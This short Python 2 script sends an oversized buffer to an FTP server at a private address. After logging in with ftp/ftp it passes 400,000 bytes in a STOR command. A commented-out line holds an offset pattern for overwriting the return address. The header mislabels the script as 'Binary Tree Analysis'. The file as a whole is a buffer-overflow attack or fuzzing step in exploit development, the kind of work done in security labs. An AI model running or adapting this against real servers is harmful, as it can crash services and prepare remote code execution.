#!/usr/bin/python
#this script is to perform Binary Tree Analysis.  

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


#buffer = '\x41' * 966 + '\x42' * 4 + '\x43' * 1030
buffer = '\x41' * 400000

print "\nSendin' Duh Eevilll Buffur!!!"
print "\n...buff, buff, buff..."
s.connect (('192.168.0.101',21))
data = s.recv(1024)

s.send ('USER ftp' + '\r\n')
data = s.recv(1024)

s.send ('PASS ftp' + '\r\n')
data = s.recv(1024)

s.send ('STOR ' + buffer + '\r\n') 
s.close()

